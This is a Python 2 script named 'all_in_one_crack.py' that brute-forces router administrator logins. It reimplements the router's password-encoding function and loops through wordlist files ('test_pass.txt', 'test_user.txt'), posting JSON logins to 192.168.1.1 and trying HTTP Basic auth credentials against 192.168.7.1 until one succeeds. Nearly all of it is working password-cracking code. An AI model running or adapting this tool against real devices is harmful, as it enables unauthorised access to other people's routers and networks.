#!/usr/bin/python
# coding:utf-8

# tools - all_in_one_crack.py
# 2017/12/27 19:58
# 

__author__ = 'Benny <benny@bennythink.com>'

import requests
import time
from base64 import b64encode
from measurement import exe_time


def security_encode(b):
    a = 'RDpbLfCPsJZ7fiv'
    c = 'yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW'

    e = ''
    g = len(a)
    h = len(b)
    k = len(c)

    f = g if g > h else h
    for p in range(f):
        n = l = 187
        if p >= g:
            n = ord(b[p])
        elif p >= h:
            l = ord(a[p])
        else:
            l = ord(a[p])
            n = ord(b[p])
        e += c[((l ^ n) % k)]
    return e


# TODO: slower!
def new_login(password):
    # time.sleep(1)
    # s = requests.session()
    s.get('http://192.168.1.1', headers={'Content-Type': 'application/json'})
    r = s.post('http://192.168.1.1', json={"method": "do", "login": {"password": security_encode(password)}})
    print 'trying `%s`...%d' % (password, r.status_code)
    if r.status_code == 200:
        return True, 'the password is %s' % password
    else:
        return False, -1


def new_crack():
    with open('test_pass.txt', 'r') as f:
        while True:
            line = f.readline()
            if len(line) == 0:
                break
            else:
                result, msg = new_login(line.rstrip('\n'))
                if result:
                    return msg


def old_login(username, password):
    r = s.get('http://192.168.7.1',
              headers={'Authorization': 'Basic ' + b64encode('%s:%s' % (username, password))})

    print 'trying `%s` and `%s`...%d' % (username, password, r.status_code)
    if r.status_code == 200:
        return True, 'the username:password is %s:%s' % (username, password)
    else:
        return False, -1


@exe_time
def old_crack():
    f1 = open('test_user.txt', 'r')
    f2 = open('test_pass.txt', 'r')

    while True:
        username = f1.readline()
        if len(username) == 0:
            break
        else:
            while True:
                password = f2.readline()
                if len(password) == 0:
                    f2.seek(0)
                    break
                else:
                    result, msg = old_login(username.rstrip('\n'), password.rstrip('\n'))
                    if result:
                        return msg
    f1.close()
    f2.close()


def test_security_encode():
    assert '0KcgeXhc9TefbwK' == security_encode('123456')


if __name__ == '__main__':
    s = requests.session()
    print old_crack()
